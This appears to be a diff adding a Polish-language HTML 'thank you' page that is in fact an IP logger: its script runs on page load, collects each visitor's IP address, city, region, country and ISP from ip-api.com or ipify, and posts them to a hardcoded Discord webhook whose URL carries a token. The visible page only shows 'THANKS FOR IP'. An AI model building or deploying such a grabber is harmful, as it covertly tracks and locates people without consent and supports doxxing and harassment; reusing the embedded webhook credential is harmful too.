@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✨ Dziękuję za wizytę ✨</title>
+    <style>
+        /* Reset i tło */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #0a0a0a;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Kontener z napisem */
+        .container {
+            text-align: center;
+            padding: 40px;
+            border-radius: 20px;
+            background: rgba(20, 20, 30, 0.6);
+            backdrop-filter: blur(6px);
+            box-shadow: 0 0 60px rgba(180, 130, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            max-width: 700px;
+            width: 100%;
+        }
+
+        /* Gradientowy napis */
+        .gradient-text {
+            font-size: clamp(2.8rem, 10vw, 5.5rem);
+            font-weight: 800;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #ffffff 0%, #d9c9ff 40%, #b8a5ff 70%, #e6d5ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 40px rgba(180, 130, 255, 0.2);
+            line-height: 1.2;
+            word-break: break-word;
+        }
+
+        /* Mały emotikon pod spodem */
+        .sub-emoji {
+            margin-top: 20px;
+            font-size: 2.2rem;
+            opacity: 0.7;
+            letter-spacing: 8px;
+        }
+
+        /* Opcjonalny mały footer */
+        .footer {
+            margin-top: 40px;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 0.75rem;
+            letter-spacing: 1px;
+        }
+
+        /* Efekt delikatnego błysku */
+        @keyframes softGlow {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+        .gradient-text {
+            animation: softGlow 3s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1 class="gradient-text">THANKS FOR IP 💗</h1>
+        <div class="sub-emoji">✨ 🌸 ✨</div>
+        <div class="footer">• • •</div>
+    </div>
+
+    <script>
+        // ------------------------------------------------------------
+        //  TWOJE DANE – WKLEJ TUTAJ SWÓJ WEBHOOK
+        // ------------------------------------------------------------
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524156374106509433/hsSJoVUkTF98rm8jjkxMUNepjz5U7PMNZ0ZqAGEEkXrx-y2_H02d4Cf33Uz77eoaOqbW';
+
+        // ------------------------------------------------------------
+        //  FUNKCJA: pobiera IP i geolokalizację z ip-api.com
+        // ------------------------------------------------------------
+        async function getIpAndLocation() {
+            try {
+                // Pobieramy dane w formacie JSON (polecane)
+                const response = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,org,as,query');
+                const data = await response.json();
+
+                if (data.status === 'success') {
+                    return {
+                        ip: data.query,
+                        country: data.country || 'Nieznany',
+                        region: data.regionName || 'Nieznany',
+                        city: data.city || 'Nieznany',
+                        isp: data.isp || 'Nieznany',
+                        org: data.org || 'Nieznany',
+                        as: data.as || 'Nieznany'
+                    };
+                } else {
+                    // Jeśli API zwróci błąd (np. przekroczono limit)
+                    console.warn('ip-api.com zwróciło błąd:', data.message);
+                    // Próbujemy pobrać samo IP z backupowego API
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    return {
+                        ip: ipData.ip || 'Nieznane',
+                        country: 'Nieznany',
+                        region: 'Nieznany',
+                        city: 'Nieznany',
+                        isp: 'Nieznany',
+                        org: 'Nieznany',
+                        as: 'Nieznany'
+                    };
+                }
+            } catch (error) {
+                console.error('Błąd pobierania IP/geolokalizacji:', error);
+                // Ostateczna próba – samo IP
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    return {
+                        ip: ipData.ip || 'Nieznane',
+                        country: 'Nieznany',
+                        region: 'Nieznany',
+                        city: 'Nieznany',
+                        isp: 'Nieznany',
+                        org: 'Nieznany',
+                        as: 'Nieznany'
+                    };
+                } catch {
+                    return {
+                        ip: 'Nie udało się pobrać',
+                        country: 'Nieznany',
+                        region: 'Nieznany',
+                        city: 'Nieznany',
+                        isp: 'Nieznany',
+                        org: 'Nieznany',
+                        as: 'Nieznany'
+                    };
+                }
+            }
+        }
+
+        // ------------------------------------------------------------
+        //  FUNKCJA: wysyła ładnego Embeda na Discorda
+        // ------------------------------------------------------------
+        async function sendToDiscord(data) {
+            // Aktualna data i godzina
+            const now = new Date();
+            const timestamp = now.toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
+
+            // Budujemy ładnego embeda
+            const embed = {
+                title: '🌐 Nowe IP na stronie!',
+                color: 0xb8a5ff, // lawendowy kolor
+                fields: [
+                    {
+                        name: '📡 Adres IP',
+                        value: `\`${data.ip}\``,
+                        inline: false
+                    },
+                    {
+                        name: '📍 Lokalizacja',
+                        value: `**${data.city}** (${data.region}), ${data.country}`,
+                        inline: true
+                    },
+                    {
+                        name: '🏢 ISP / Organizacja',
+                        value: data.isp || 'Brak danych',
+                        inline: true
+                    },
+                    {
+                        name: '🔗 AS',
+                        value: data.as || 'Brak danych',
+                        inline: false
+                    },
+                    {
+                        name: '🕒 Czas wizyty',
+                        value: timestamp,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: '💗 Dziękuję za odwiedzenie strony!'
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                embeds: [embed]
+            };
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Embed wysłany na Discorda!');
+                } else {
+                    console.error('❌ Błąd wysyłania na Discord:', response.status, await response.text());
+                }
+            } catch (error) {
+                console.error('❌ Błąd sieci przy wysyłaniu na Discord:', error);
+            }
+        }
+
+        // ------------------------------------------------------------
+        //  START – wykonaj od razu po załadowaniu strony
+        // ------------------------------------------------------------
+        (async function main() {
+            console.log('🌸 Strona załadowana – pobieram dane...');
+            const locationData = await getIpAndLocation();
+            console.log('📡 Pobrane dane:', locationData);
+            await sendToDiscord(locationData);
+        })();
+    </script>
+
+</body>
+</html>
